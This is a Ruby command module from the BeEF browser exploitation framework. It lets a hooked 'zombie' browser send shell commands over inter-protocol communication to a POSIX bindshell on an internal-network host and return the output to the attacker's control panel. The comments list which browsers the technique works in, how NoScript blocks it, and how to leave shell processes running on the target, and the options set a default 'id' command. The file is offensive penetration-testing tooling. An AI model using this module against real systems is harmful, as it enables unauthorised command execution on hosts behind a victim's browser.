#
# Copyright (c) 2006-2013 Wade Alcorn - wade@bindshell.net
# Browser Exploitation Framework (BeEF) - http://beefproject.com
# See the file 'doc/COPYING' for copying permission
#
=begin
[+] Summary:

Using Inter-protocol Communication (IPC) the zombie browser will send commands to a listening POSIX shell bound on the target specified in the 'Target Address' input. The target address can be on the zombie's subnet which is potentially not directly accessible from the Internet.

The command results are returned to the BeEF control panel.

[+] Tested:

o Working:
	o Mozilla Firefox 6

o Not Working:
	o Mozilla Firefox 6 with the NoScript extension
	o Internet Explorer 8+
	o Chrome 13
	o Opera 11
	o Safari 5

[+] Notes:

o The bindshell is closed once the module has completed. This is necessary otherwise the /bin/sh process will hang. To avoid this issue:

	o remove the last "& exit" portion of the JavaScript payload. Be aware that this will leave redundant /bin/sh processes running on the target system.

o The NoScript extension for Firefox aborts the request when attempting to access a host on the internal network and displays the following warning:

	[ABE] <LOCAL> Deny on {POST http://localhost:4444/index.html?&/bin/sh&& <<< about:blank - 7}
	SYSTEM rule:
	Site LOCAL
	Accept from LOCAL
	Deny

o Internet Explorer is not supported as IE 8+ does not allow posting data to internal network addresses. Earlier versions of IE have not been tested.

o Returning the shell command results is not supported in Chrome, Safari and Opera as JavaScript cannot be executed within the bindshell iframe. The shell commands are executed on the target shell however.

o This module is incompatible with autorun. Upon completing the shell commands it will load the original hooked window in a child iframe resulting in an additional hook. This will result in an infinite loop if this module is set to autorun.

=end

class Inter_protocol_posix_bindshell < BeEF::Core::Command
  
  def self.options
    return [
	{'name'=>'ip', 'ui_label' => 'Target Address', 'value' => 'localhost'},
	{'name'=>'port', 'ui_label' => 'Target Port', 'value' => '4444'},
	{'name'=>'command_timeout', 'ui_label'=>'Timeout (s)', 'value'=>'30'},
	{'name'=>'cmd', 'ui_label' => 'Shell Commands', 'description' => 'Enter shell commands to execute. Note: the semicolons are required to seperate commands', 'type'=>'textarea', 'value'=>'echo ID: ; id', 'width'=>'200px' },
    {'name'=>'result_size', 'ui_label'=>'Result Size', 'description'=>'Expected maximum size of the result in bytes','value'=>'1024'}
    ]
  end

  def post_execute
    content = {}
    content['result'] = @datastore['result'] if not @datastore['result'].nil?
    content['fail'] = @datastore['fail'] if not @datastore['fail'].nil?
    if content.empty?
      content['fail'] = 'No data was returned.'
    end
    save content
  end
end
